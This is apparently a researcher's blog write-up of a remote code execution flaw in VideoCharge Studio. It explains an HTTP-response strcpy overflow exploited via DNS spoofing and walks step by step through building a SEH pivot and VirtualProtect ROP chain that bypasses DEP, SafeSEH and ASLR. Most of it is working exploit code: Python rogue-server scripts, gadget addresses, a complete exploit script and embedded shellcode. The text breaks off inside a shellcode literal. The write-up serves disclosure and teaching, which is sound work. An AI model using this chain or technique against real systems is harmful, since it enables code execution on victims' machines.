---
title: VideoCharge Studio v2.12.3.685 GetHttpResponse() Remote Code Execution
parent_id: '0'
categories:
- RCE
- Advisory
- Exploit
---
I'm focusing on exploit development at the moment and it's time to raise the level to my personal next challenge: I've rm -rf'ed my Windows XP virtual machine! Now I'm happy to announce and document my first full VirtualProtect() ROP Remote Code Execution Exploit, which bypasses all known security mechanisms on Windows 7 - like SafeSEH, ASLR and DEP. Sounds like some funny pwnage...

I'm not going to dig too deep into DEP theory here - Corelan did already a [great job](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/) on this! Plus I'm not going to use their mona.py tool to generate a complete ROP chain, because of two major reasons:

1.  An exploiter who didn't write his first ROP exploit by himself, is a script kiddie - and I am not ;-)
2.  Even if I would use it, it wouldn't work because of a lot of restrictions in this special case :-(

(I only use it to find the different ROP gadgets because doing this manually really, really sucks)

Neither the applications itself nor the vulnerability is very interesting - it's a common issue, but the exploitation process is really thrilling - I promise! During the exploit development process, I had to deal with a lot of problems like  0x00 bytes and really creepy call restrictions, but more about this later...

### Some words about the root-cause of the vulnerability

It's a previously unknown Remote Code Execution vulnerability in the software called [VirtualCharge Studio v2.12.3.685](http://www.virtualcharge.com) and it's  exploitable in a MITM (e.g. DNS-Spoofing or DNS-Cache Poisoning) scenario, where the attacker controls the IP behind the domain www.viceocharge.com to redirect the traffic. The complete Full-Disclosure posting can be found [here](http://seclists.org/fulldisclosure/2014/Feb/186).

The root-cause of the vulnerability is a combination of failing to validate the HTTP Content-Length value and the usage of the insecure function strcpy().

The application sends several HTTP GET requests to www.videocharge.com in different situations like checking for available updates or during the license activation process. The HTTP responses of the website are parsed using the following function from cc.dll:

{% highlight cpp %}
static int __cdecl CHTTPResponse::GetHttpResponse(char const *,char const *,char *)
{% endhighlight %}

This function reads the contents of the response page using an InternetReadFile() call with dwNumberOfBytesToRead set to 745 bytes. Afterwards the application uses an insecure strcpy() call to further process the received data:

{% highlight text %}
1016D827 CALL cc.1020ACF0 ; strcpy()
{% endhighlight %}

Although 745 bytes are enough to trigger the buffer overflow, the application additionally does not perform a validation of the Content-Length value of the HTTP response, and will execute the InternetReadFile call a second time if the Content-Length value is greater than 745 with the dwNumberOfBytesToRead argument set to [Content-Length - 745] to make sure all bytes from the response are read, and uses the same strcpy() call to further process the received data, resulting in huge amounts of memory, that can be controlled by an attacker. This leads to a stack-based buffer overflow with an overwritten SEH chain, resulting in remote code execution.

The vulnerable code part:

[![videocharge-rce-1]({{ site.baseurl }}/assets/videocharge-rce-1-1024x812.png)]({{ site.baseurl }}/assets/videocharge-rce-1.png)

### Some words about the following exploit documentation

I'm going to exploit the license activation process in this documentation. For a successfull activation you need at least two things:

1.  A valid (client-side generated) serial number. Otherwise the application won't let you perform its "Auto-activation through the internet". I'm not going to write a tutorial about how to reverse engineer the serial generation process here - due to legal reasons. If you want to try it yourself - it's your challenge!
2.  To exploit this vulnerability you do not need an active subscription/registration on videocharge.com. If you have a valid serial, the application checks this against the activation servers and even a "oops, we did not found your serial" answer is exploitable. This is what I will demonstrate in the following documentation.

### Let's get to work - How does the license activation process work?

Let's first have a look what happens in the communication process between the installed application and the servers of VideoCharge. During the start of the application, you can activate the application right away:

[![videocharge-rce-0]({{ site.baseurl }}/assets/videocharge-rce-0.png)]({{ site.baseurl }}/assets/videocharge-rce-0.png)

At this point Wireshark captured the following request made by the application:

{% highlight text %}
GET /scripts/vcstudio/acauto.php?sn=[*removed*]10337&hdd=[*removed*]41 HTTP/1.1
{% endhighlight %}

resulting in the corresponding HTTP response from the server:

{% highlight text %}
HTTP/1.1 200 OK
Date: Date: Sat, 09 Feb 2014 13:33:37 GMT
Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-1+lenny16
Vary: Accept-Encoding
Content-Length: 16
Connection: close
Content-Type: text/html

unksn
{% endhighlight %}

Interesting! If the serial number is invalid, the web-server responds with a simple "unksn". That's the target! The vulnerability can be exploited by replacing the "unksn" with some arbitrary shellcode - stuff, which is read and parsed by the above mentioned InternetReadFile() and strcpy() call.

### Proof-of-Concept

The following Python script simply reads the request made by the application and responses with the arbitrary value. **Please remember** that you have to spoof the DNS A-record for www.videocharge.com for this to work:

{% highlight python %}
from socket import *
from struct import pack
from time import sleep

host = "192.168.0.1"
port = 80

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]

junk0 = "\xCC" * 4000

payload = junk0

buffer = "HTTP/1.1 200 OK\r\n"
buffer += "Date: Sat, 09 Feb 2014 13:33:37 GMT\r\n"
buffer += "Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n"
buffer += "X-Powered-By: PHP/5.2.6-1+lenny16\r\n"
buffer += "Vary: Accept-Encoding\r\n"
buffer += "Content-Length: 4000\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: text/html\r\n\r\n"
buffer += payload
buffer += "\r\n"

print cl.recv(1000)

cl.send(buffer)

print "[+] Sending buffer: OK\n"

sleep(1)
cl.close()
s.close()
{% endhighlight %}

The increased Content-Length value of 4000 triggers the stack-based buffer overflow, which results in an overwritten SEH - chain:

[![videocharge-rce-3]({{ site.baseurl }}/assets/videocharge-rce-3-1024x676.png)]({{ site.baseurl }}/assets/videocharge-rce-3.png)

Vulnerability proofed.

### Some very few basics about DEP

Since I've enabled DEP for all applications in my testing lab, I have to mess with memory limitations. Quoted from [Wikipedia](https://en.wikipedia.org/wiki/Data_Execution_Prevention):

> DEP protects against some program errors, and helps prevent certain malicious exploits, those that store executable instructions in a data area via a buffer overflow for example.[1] It does not protect against attacks that do not rely on execution of instructions in the data area. Other security features such as address space layout randomization, structured exception handler overwrite protection (SEHOP) and Mandatory Integrity Control, can be used in conjunction with DEP.[2]

This simply means that the shellcode, which is placed on the stack cannot be executed, because it's arbitrary and doesn't belong to the applications data area. So,if you launch a classic SEH-based exploit against a DEP-enabled target like:

{% highlight python %}
from socket import *
from struct import pack
from time import sleep

host = "192.168.0.1"
port = 80

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]

# windows/exec CMD=calc.exe
# Encoder: x86/shikata_ga_nai
# powered by Metasploit
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00'

shellcode = ("\xba\x68\x3e\x85\x1f\xd9\xca\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x33\x31\x50\x12\x83\xe8\xfc\x03\x38\x30\x67\xea\x44" +
"\xa4\xee\x15\xb4\x35\x91\x9c\x51\x04\x83\xfb\x12\x35\x13" +
"\x8f\x76\xb6\xd8\xdd\x62\x4d\xac\xc9\x85\xe6\x1b\x2c\xa8" +
"\xf7\xad\xf0\x66\x3b\xaf\x8c\x74\x68\x0f\xac\xb7\x7d\x4e" +
"\xe9\xa5\x8e\x02\xa2\xa2\x3d\xb3\xc7\xf6\xfd\xb2\x07\x7d" +
"\xbd\xcc\x22\x41\x4a\x67\x2c\x91\xe3\xfc\x66\x09\x8f\x5b" +
"\x57\x28\x5c\xb8\xab\x63\xe9\x0b\x5f\x72\x3b\x42\xa0\x45" +
"\x03\x09\x9f\x6a\x8e\x53\xe7\x4c\x71\x26\x13\xaf\x0c\x31" +
"\xe0\xd2\xca\xb4\xf5\x74\x98\x6f\xde\x85\x4d\xe9\x95\x89" +
"\x3a\x7d\xf1\x8d\xbd\x52\x89\xa9\x36\x55\x5e\x38\x0c\x72" +
"\x7a\x61\xd6\x1b\xdb\xcf\xb9\x24\x3b\xb7\x66\x81\x37\x55" +
"\x72\xb3\x15\x33\x85\x31\x20\x7a\x85\x49\x2b\x2c\xee\x78" +
"\xa0\xa3\x69\x85\x63\x80\x86\xcf\x2e\xa0\x0e\x96\xba\xf1" +
"\x52\x29\x11\x35\x6b\xaa\x90\xc5\x88\xb2\xd0\xc0\xd5\x74" +
"\x08\xb8\x46\x11\x2e\x6f\x66\x30\x4d\xee\xf4\xd8\xbc\x95" +
"\x7c\x7a\xc1")

junk0 = "\x90" * 1273
nseh="\x90\x90\xeb\x06"
eip=pack('<L',0x61b811f1) #{pivot 8 / 0x08} :  # POP EDI # POP EBP # RETN [zlib1.dll]
junk1 = "\x90" * 20
payload = junk0 + nseh + eip + junk1 + shellcode

buffer = "HTTP/1.1 200 OK\r\n"
buffer += "Date: Sat, 09 Feb 2014 13:33:37 GMT\r\n"
buffer += "Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n"
buffer += "X-Powered-By: PHP/5.2.6-1+lenny16\r\n"
buffer += "Vary: Accept-Encoding\r\n"
buffer += "Content-Length: 2000\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: text/html\r\n\r\n"
buffer += payload
buffer += "\r\n"

print cl.recv(1000)

cl.send(buffer)

print "[+] Sending exploit: OK\n"

sleep(3)
cl.close()
s.close()
{% endhighlight %}

...it'll result in an Access Violation when it comes to the execution of the supplied exploit chain:

[![videocharge-rce-4]({{ site.baseurl }}/assets/videocharge-rce-4-1024x771.png)]({{ site.baseurl }}/assets/videocharge-rce-4.png)

### Bypassing DEP using ROP and VirtualProtect

The solution for the above DEP-related Access Violation exception is quite simple in its idea:

If you are not able to execute your own code directly on the stack, you need to find a way to build your exploit based on what you've already got: the data section of the application. But one problem remains:

**The shellcode is still placed on the stack and needs to be executed there. No way around this!**

The solution for this problem is built-in Microsoft Windows and is called [VirtualProtect()](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx) (its home: kernel32.dll). This function is able to change the protection flag for the supplied memory space to make it executable for the calling process. The call structure is quite easy:

{% highlight cpp %}
BOOL WINAPI VirtualProtect(
  _In_   LPVOID lpAddress,     // address of the memory space to be made executeable
  _In_   SIZE_T dwSize,        // size of the space (depends on shellcode size)
  _In_   DWORD flNewProtect,   // new protection flag (0x40 for exec)
  _Out_  PDWORD lpflOldProtect // revert to this protection flag + writeable
);
{% endhighlight %}

In theory all you need is to put the call to VirtualProtect() and its parameters on the stack and execute the VirtualProtect() call to unprotect your shellcode-area and then move on to your shellcode. <span style="line-height: 1.428571429;">This can be accomplished by searching for appropriate instructions in the data section of the corresponding application binaries that are followed by a RETN and those addresses are put on the stack instead of e.g. the SHORT JUMP - in case of SEH.</span>

**Summarized**: Using this Return-Oriented-Programming (ROP) method, you modify the stack by putting executable data offsets on it, with the goal of putting the parameters for the VirtualProtect() call and the call itself on the stack and finally execute this sequence. These offsets contain instructions from the data section of the executable instead of the stack directly, and because every instruction set (ROP gadget) ends with a RETN it automatically executes the next offset on the stack. This quite nice hopping is called ROP chain - let's see it in action.

### Some special limitations

1.  In this special case of VideCharge Studio: You cannot use any special characters in the HTTP response like 0x00, 0x0a or 0x0d - these will break your complete exploit and therefore have to be avoided!
2.  You only have 3 potential modules you can work with. All others are at least rebased and ASLR enabled. That shrinks the available options dramatically!
3.  You cannot use vcstudio.exe completely, because it starts with a 0x00! But wait. The vcstudio.exe is the only one that contains references to the VirtualProtect() function. Too bad - but there's a way around this!

{% highlight text %}
Base | Top | Size | Rebase | SafeSEH | ASLR | NXCompat | OS Dll | Version, Modulename & Path
0x00400000 | 0x009bb000 | 0x005bb000 | False  | True    | False |  False   | False  | 2.12.3.685 [vcstudio.exe] (C:\Program Files (x86)\VideoCharge Software\VideoCharge Studio\vcstudio.exe)
0x61b80000 | 0x61b98000 | 0x00018000 | False  | False   | False |  False   | False  | 1.2.3.2027 [zlib1.dll] (C:\Program Files (x86)\VideoCharge Software\VideoCharge Studio\zlib1.dll)
0x10000000 | 0x1032b000 | 0x0032b000 | False  | True    | False |  False   | False  | -1.0- [cc.dll] (C:\Program Files (x86)\VideoCharge Software\VideoCharge Studio\cc.dll)
{% endhighlight %}

### The ROP registers structure

To keep track of things, I'll use the following registers for the VirtualProtect parameters:

EBP - VirtualProtect() call  
ESP - lpAddress  
EBX - dwSize  
EDX - flNewProtect  
ECX - lpflOldProtect  
EAX - is only used for crafting/calculations

I'm going to craft the different parameters using ROP and put them accordingly into the mentioned registers. Important is that once you've put the right value into the register, it shouldn't be modified anymore. Otherwise it could be very hard to regain the modified value.

### Step 1 - Stackpivoting from SEH

This is quite usual for a SEH-based exploit: at some point you've control over EIP. Find this location and perform some crazy stackpivoting to your controlled area. Luckily the developers left one module (zlib1.dll) without SafeSEH - protection leading to complete SafeSEH - bypass:

EIP control is gained after 1277 bytes of junk, but it's quite a long distance (at least ESP+698) to the controlled memory space:

[![videocharge-rce-5]({{ site.baseurl }}/assets/videocharge-rce-5-1024x752.png)]({{ site.baseurl }}/assets/videocharge-rce-5.png)

The only option you have in this case (and I'm glad it's there) is to take the instruction at **0x61b84af1**:

{% highlight text %}
ADD ESP,101C
RETN
{% endhighlight %}

this moves the EIP to the controlled area.

**Achievement unlocked!**

### Step 2 - Craft VirtualProtect() offset 0x0080D816 via [DE27BAF3 XOR DEADBEEF] and MOV to EBP

Let's start with the most complex one. Do you remember that you cannot use 0x00 ? Have a look at this:

[![videocharge-rce-6]({{ site.baseurl }}/assets/videocharge-rce-6.png)]({{ site.baseurl }}/assets/videocharge-rce-6.png)

**0x008A041C** - damn. The only reference in vcstudio.exe starts with a 0x00 :-(

**Side notice:** Using the following trick I tried to generate the shown address **0x008A041C**, but during testing the application always threw an unhandled exception, sadly - I don't know why. That's the reason why I'm sticking with the following VirtualProtect() call at **0x0080D816**:

[![videocharge-rce-7]({{ site.baseurl }}/assets/videocharge-rce-7.png)]({{ site.baseurl }}/assets/videocharge-rce-7.png)

Since there are only a few instructions between the call of VirtualProtect (forget about the arguments at the moment) at **0x0080D816** and the RETN at **0x0080D83A**, I'm using this way of calling the VirtualProtect() function. You only have to make sure that all instructions between both offsets are able to work with values that do not throw an exception and therefore terminating the exploitation flow.  We will recap this important point at the end, when we'll actually call this function!

Let's get dirty. Since you cannot use 0x00, you need to somehow calculate the offset **0x0080D816** using given instructions. One easy and - in my opinion the sortest way of doing that is using XOR!

First of all, let's XCHG the values of EAX and EAX to make sure that the following XOR will work:

{% highlight python %}
rop = pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
{% endhighlight %}

The next instructions, will simply POP the values **0xDE2D66F9** to EDI and **0xDEADBEEF** to EBX.

{% highlight python %}
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0xDE2D66F9)
rop += pack('<L',0x10206ac5) # POP EBX # RETN [cc.dll]
rop += pack('<L',0xDEADBEEF)
{% endhighlight %}

It's quite hard to find an appropriate XOR instruction in the supplied application modules, but this one will do the work:

{% highlight python %}
rop += pack('<L',0x1002fb27) # XOR EDI,EBX # ADD DL,BYTE PTR DS:[EAX] # RETN [cc.dll]
{% endhighlight %}

At this point you see that there is an ADD instruction that actually copies something to DL. That's the reason you have to execute the first XCHG to get a valid address into EAX, otherwise the application will crash, because the parameters before the XCHG were:

EAX = 0x00000000 = bad for the ADD instruction

ECX = some valid memory address

[![videocharge-rce-8]({{ site.baseurl }}/assets/videocharge-rce-8.png)]({{ site.baseurl }}/assets/videocharge-rce-8.png)

Since you've executed the XCHG instruction first, ECX now contains **0x61B84AF1** and the XOR instruction can finish silently. The result is amazing: Now EDI contains **0x0080D816** - the targeted VirtualProtect() call!

[![videocharge-rce-9]({{ site.baseurl }}/assets/videocharge-rce-9.png)]({{ site.baseurl }}/assets/videocharge-rce-9.png)

Finally: MOV EDI to EAX and XCHG EAX with EBP (there is no other way to XCHG EDI with EBP):

{% highlight python %}
rop += pack('<L',0x101f7572) # MOV EAX,EDI # POP EDI # RETN [cc.dll]  
rop += pack('<L',0xDEADBEEF)
rop += pack('<L',0x101fbc62) # XCHG EAX,EBP # RETN [cc.dll]
{% endhighlight %}

**Side-Notice:** **0xDEADBEEF** is always a filler, except in this XOR calculation ;-)

**Achievement unlocked!**

### Step 3 - Craft VirtualProtect() dwSize in EAX and move to EBX

This one is easy:

Clearing EAX, ADDing 0x500 on top of it and XCHG with EBX

{% highlight python %}
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x101f2adc) # ADD EAX,500 # RETN [cc.dll]
rop += pack('<L',0x1023ccfb) # XCHG EAX,EBX # RETN [cc.dll]
{% endhighlight %}

0x500 (1280bytes) are more than enough for the shellcode.

**Achievement unlocked!**

### Step 4 - Craft VirtualProtect() flNewProtect in EAX and move to EDX

Remember: flNewProtect needs to be 0x40 and needs to be put into EDX. This value is quite small and can easily be calculated after clearing EAX using XOR:

{% highlight python %}
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x102026a1) # ADD EAX,25 # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102026b1) # ADD EAX,3 # RETN [cc.dll]
rop += pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b90402) # MOV EDX,ECX # RETN [zlib1.dll]
{% endhighlight %}

**Achievement unlocked!**

### Step 5 - Put writable offset for VirtualProtect() lpflOldProtect to ECX

That's easy. Thanks to Immunity Debugger's memory view, you can easily select a random address which has to be writable:

[![videocharge-rce-10]({{ site.baseurl }}/assets/videocharge-rce-10.png)]({{ site.baseurl }}/assets/videocharge-rce-10.png)

I've chosen one from zlib1.dll resources section (0x61B96180).

{% highlight python %}
rop += pack('<L',0x1020aacf) # POP ECX # RETN [cc.dll]
rop += pack('<L',0x61B96180) # writable location [zlib1.dll]
{% endhighlight %}

**Achievement unlocked!**

### Step 6 - VirtualProtect() lpAddress and prepare for PUSHAD!

Great. You're next to the end :-). Let's have a look at the current register contents:

[![videocharge-rce-11]({{ site.baseurl }}/assets/videocharge-rce-11.png)]({{ site.baseurl }}/assets/videocharge-rce-11.png)

EAX = It's empty...nobody actually cares!  
ECX = **VirtualProtect() lpflOldProtect**  
EDX= **VirtualProtect() flNewProtect **  
EBX = **VirtualProtect() dwSize**  
ESP = **VirtualProtect() lpAddress**  
EBP = **VirtualProtect() call from vcstudio.exe**

As ESP is always pointing to the top of the stack, this automatically solves the problem of getting the correct VirtualProtect() lpAddress value, the place where the nopsled / shellcode begins. This is nearly the perfect layout for a PUSHAD instruction. PUSHAD pushes the values of all registers on the stack, beginning with EAX and ending with EDI. This would lead to the following stack layout after PUSHAD:

[![videocharge-rce-12]({{ site.baseurl }}/assets/videocharge-rce-12.png)]({{ site.baseurl }}/assets/videocharge-rce-12.png)

Great - the offset to the vcstudio.exe's VirtualProtect() call is located at ESP+8, followed by it's arguments :-) !

You only have to deal with the values from ESI (**0x00000000**) and EDI (**0xDEADBEEF**) that'll be executed next (since they are on the top of the stack!). This means you've got two possible ROP gadgets left to use. This is a perfect match, since you really, really need them...Let's review the VirtualProtect() call starting at **0x0080D816**:

{% highlight text %}
0080D816  |. FF15 1C048A00  CALL DWORD PTR DS:[<&KERNEL32.VirtualPro>; \VirtualProtect
0080D81C  |. F607 40        TEST BYTE PTR DS:[EDI],40
0080D81F  |. 8B46 1C        MOV EAX,DWORD PTR DS:[ESI+1C]
0080D822  |. 74 05          JE SHORT vcstudio.0080D829
0080D824  |. 83C8 40        OR EAX,40
0080D827  |. EB 03          JMP SHORT vcstudio.0080D82C
0080D829  |> 83E0 BF        AND EAX,FFFFFFBF
0080D82C  |> 8907           MOV DWORD PTR DS:[EDI],EAX
0080D82E  |. 8B46 20        MOV EAX,DWORD PTR DS:[ESI+20]
0080D831  |. 8947 04        MOV DWORD PTR DS:[EDI+4],EAX
0080D834  |. 33C0           XOR EAX,EAX
0080D836  |. 40             INC EAX
0080D837  |> 5F             POP EDI
0080D838  |. 5E             POP ESI
0080D839  |> 5D             POP EBP
0080D83A  \. C2 0C00        RETN 0C
{% endhighlight %}

The four different instructions at **0x0080D81F**, **0x0080D82C**, **0x0080D82E** and **0x0080D831** either read or write to the offsets at ESI or EDI. If you would leave the  values in ESI (**0x00000000**) and EDI (**0xDEADBEEF**) as they are, the application would terminate, because it's not possible to read or write to these locations.

Solution: Use the first ROP gadget to put some readable/writable offset to ESI:

{% highlight python %}
rop += pack('<L',0x61b850a4) # POP ESI # RETN [zlib1.dll]
rop += pack('<L',0x61B96180) # writable location from [zlib1.dll]
{% endhighlight %}

...and the second ROP gadget to Double-POP-EDI to make sure you can reach the VirtualProtect() call and at the same time representing a readable/writable address:

{% highlight python %}
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
{% endhighlight %}

And last but not least:

{% highlight python %}
rop += pack('<L',0x101e93d6) # PUSHAD # RETN [cc.dll]
{% endhighlight %}

**Achievement unlocked!**

### Step 7 - Finally execute VirtualProtect() and move on to the shellcode

After the PUSHAD, the stack layout is as following:

[![videocharge-rce-13]({{ site.baseurl }}/assets/videocharge-rce-13.png)]({{ site.baseurl }}/assets/videocharge-rce-13.png)

**0x61B849B6** points to the mentioned POP EDI instruction to move the value **0x61B96180** to the register and finally executes the VirtualProtect() call at **0x0080D816**

[![videocharge-rce-14]({{ site.baseurl }}/assets/videocharge-rce-14-1024x752.png)]({{ site.baseurl }}/assets/videocharge-rce-14.png)

...using the parameters from the stack:

{% highlight text %}
ESP-4    > 0080D816  vcstudio.0080D816
ESP ==>  > 00187FFC  |Address = 00187FFC
ESP+4    > 00000500  |Size = 500 (1280.)
ESP+8    > 00000040  |NewProtect = PAGE_EXECUTE_READWRITE
ESP+C    > 61B96180  \pOldProtect = zlib1.61B96180
{% endhighlight %}

**Achievement unlocked: Pwnage!**

### Step 8 - Finalize the exploit!

The VirtualProtect() code part ends with the instruction RETN 0C at **0x0080D83A**, which magically returns into the unprotected stackpart:

[![videocharge-rce-15]({{ site.baseurl }}/assets/videocharge-rce-15-1024x753.png)]({{ site.baseurl }}/assets/videocharge-rce-15.png)

Placing a JMP ESP (e.g. from **0x102340e8**) at this point will lead to code execution:

[![videocharge-rce-16]({{ site.baseurl }}/assets/videocharge-rce-16.png)]({{ site.baseurl }}/assets/videocharge-rce-16.png)

### The complete exploit...

Have fun ;-)

{% highlight python %}
#!/usr/bin/python
# Exploit Title: VideoCharge Studio v2.12.3.685 cc.dll GetHttpResponse() MITM Remote Code Execution Exploit (SafeSEH/ASLR/DEP Bypass)
# Version:       v2.12.3.685
# Date:          2014-02-18
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      https://www.rcesecurity.com
# Software Link: http://www.videocharge.com
# Tested on:     Win7-GER (DEP enabled)
#
# Howto / Notes:
# Since it's a MITM RCE you need to spoof the DNS Record for www.videocharge.com in order to successfully exploit this vulnerability
#

from socket import *
from struct import pack
from time import sleep

host = "192.168.0.1"
port = 80

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]

# Thanks Giuseppe D'Amore for the amazing shellcode
# http://www.exploit-db.com/exploits/28996/
shellcode = ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+
"\x49\x0b\x31\xc0\x51\x50\xff\xd7")

junk0 = "\x90" * 1277
junk1 = "\x90" * 1900
nops="\x90" * 30
jmpesp=pack('<L',0x102340e8) * 5 # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]

# jump to controlled memory
eip=pack('<L',0x61b84af1) # {pivot 4124 / 0x101c} # ADD ESP,101C # RETN [zlib1.dll]

#
# ROP registers structure:
# EBP - VirtualProtect() call
# ESP - lpAddress
# EBX - dwSize
# EDX - flNewProtect
# ECX - lpflOldProtect
#

# Craft VirtualProtect() call (0x0080D816) via [DE2D66F9 XOR DEADBEEF] and MOV to EBP
rop = pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0xDE2D66F9) # XOR param 1
rop += pack('<L',0x10206ac5) # POP EBX # RETN [cc.dll]
rop += pack('<L',0xDEADBEEF) # XOR param 2
rop += pack('<L',0x1002fb27) # XOR EDI,EBX # ADD DL,BYTE PTR DS:[EAX] # RETN [cc.dll]
rop += pack('<L',0x101f7572) # MOV EAX,EDI # POP EDI # RETN [cc.dll]  
rop += pack('<L',0xDEADBEEF) # Filler
rop += pack('<L',0x101fbc62) # XCHG EAX,EBP # RETN [cc.dll]

# Craft VirtualProtect() dwSize in EAX and MOV to EBX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x101f2adc) # ADD EAX,500 # RETN [cc.dll]
rop += pack('<L',0x1023ccfb) # XCHG EAX,EBX # RETN [cc.dll] 

# Craft VirtualProtect() flNewProtect in EAX and MOV to EDX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x102026a1) # ADD EAX,25 # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102026b1) # ADD EAX,3 # RETN [cc.dll]
rop += pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b90402) # MOV EDX,ECX # RETN [zlib1.dll]

# Put writable offset for VirtualProtect() lpflOldProtect to ECX
rop += pack('<L',0x1020aacf) # POP ECX # RETN [cc.dll]
rop += pack('<L',0x61B96180) # writable location [zlib1.dll]

# POP a value from the stack after PUSHAD and POP value to ESI 
# as a preparation for the VirtualProtect() call
rop += pack('<L',0x61b850a4) # POP ESI # RETN [zlib1.dll]
rop += pack('<L',0x61B96180) # writable location from [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]

# Achievement unlocked: PUSHAD
rop += pack('<L',0x101e93d6) # PUSHAD # RETN [cc.dll] 
rop += pack('<L',0x102340c5) # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]

payload = junk0 + eip + junk1 + rop + jmpesp + nops + shellcode

buffer = "HTTP/1.1 200 OK\r\n"
buffer += "Date: Sat, 09 Feb 2014 13:33:37 GMT\r\n"
buffer += "Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n"
buffer += "X-Powered-By: PHP/5.2.6-1+lenny16\r\n"
buffer += "Vary: Accept-Encoding\r\n"
buffer += "Content-Length: 4000\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: text/html\r\n\r\n"
buffer += payload
buffer += "\r\n"

print cl.recv(1000)

cl.send(buffer)

print "[+] Sending exploit: OK\n"

sleep(3)
cl.close()
s.close()
{% endhighlight %}

### Some problems during shellcode execution

I tried to use a standard Metasploit calc.exe shellcode in my exploit script:

{% highlight python %}
# windows/exec CMD=calc.exe
# Encoder: x86/shikata_ga_nai
# powered by Metasploit
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00'

shellcode = ("\xba\x68\x3e\x85\x1f\xd9\xca\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x33\x31\x50\x12\x83\xe8\xfc\x03\x38\x30\x67\xea\x44" +
"\xa4\xee\x15\xb4\x35\x91\x9c\x51\x04\x83\xfb\x12\x35\x13" +
"\x8f\x76\xb6\xd8\xdd\x62\x4d\xac\xc9\x85\xe6\x1b\x2c\xa8" +
"\xf7\xad\xf0\x66\x3b\xaf\x8c\x74\x68\x0f\xac\xb7\x7d\x4e" +
"\xe9\xa5\x8e\x02\xa2\xa2\x3d\xb3\xc7\xf6\xfd\xb2\x07\x7d" +
"\xbd\xcc\x22\x41\x4a\x67\x2c\x91\xe3\xfc\x66\x09\x8f\x5b" +
"\x57\x28\x5c\xb8\xab\x63\xe9\x0b\x5f\x72\x3b\x42\xa0\x45" +
"\x03\x09\x9f\x6a\x8e\x53\xe7\x4c\x71\x26\x13\xaf\x0c\x31" +
"\xe0\xd2\xca\xb4\xf5\x74\x98\x6f\xde\x85\x4d\xe9\x95\x89" +
"\x3a\x7d\xf1\x8d\xbd\x52\x89\xa9\x36\x55\x5e\x38\x0c\x72" +
"\x7a\x61\xd6\x1b\xdb\xcf\xb9\x24\x3b\xb7\x66\x81\x37\x55" +
"\x72\xb3\x15\x33\x85\x31\x20\x7a\x85\x49\x2b\x2c\xee\x78" +
